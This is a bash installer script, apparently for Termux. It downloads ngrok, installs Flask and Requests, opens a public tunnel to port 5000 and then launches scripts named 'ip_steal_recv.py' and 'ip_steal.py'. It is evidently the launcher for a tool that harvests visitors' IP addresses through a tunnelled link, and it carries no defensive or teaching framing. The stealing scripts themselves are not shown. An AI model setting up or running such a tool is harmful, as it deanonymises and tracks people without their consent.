#!/bin/bash

RED="$(printf '\033[31m')"
GREEN="$(printf '\033[32m')"
ORANGE="$(printf '\033[33m')"
NC="$(printf '\033[0m')"

# Detect architecture
ARCH=$(uname -m)
OS=$(uname -s | tr '[:upper:]' '[:lower:]')

case "$ARCH" in
  x86_64|amd64)
    ARCH="amd64"
    ;;
  armv7l|armv6l)
    ARCH="arm"
    ;;
  aarch64)
    ARCH="arm64"
    ;;
  i386|i686)
    ARCH="386"
    ;;
  *)
    echo "${RED}Unsupported architecture: $ARCH${NC}"
    exit 1
    ;;
esac

# Ngrok filename (v3 stable releases)
FILENAME="ngrok-v3-stable-${OS}-${ARCH}.tgz"
DOWNLOAD_URL="https://bin.equinox.io/c/4VmDzA7iaHb/${FILENAME}"

# Check curl
if ! command -v curl &> /dev/null; then
  echo "${RED}curl not found. Please install curl.${NC}"
  exit 1
fi

# Download ngrok
echo "Downloading ngrok from $DOWNLOAD_URL"
curl -s -L -o "$FILENAME" "$DOWNLOAD_URL"

if [ $? -ne 0 ]; then
  echo "${RED}Download failed. Check URL or internet connection.${NC}"
  exit 1
fi

# Extract
echo "Extracting $FILENAME..."
tar -xvzf "$FILENAME"
rm "$FILENAME"

# Make executable
chmod +x ngrok

# Move to /usr/local/bin (optional)
# sudo mv ngrok /usr/local/bin/

echo "${GREEN}ngrok installed successfully!${NC}"

# Ensure Python3
if ! command -v python3 &> /dev/null; then
  echo "${ORANGE}Python3 not found. Installing...${NC}"
  pkg install -y python
fi

# Install Flask & Requests
echo "Installing Flask & Requests..."
pip install flask requests

# Configure auth token
read -p "Enter your ngrok auth token: " auth_token
./ngrok config add-authtoken "$auth_token"

# Run ngrok
echo "Starting ngrok on port 5000..."
./ngrok http 5000

python ip_steal_recv.py & python ip_steal.py



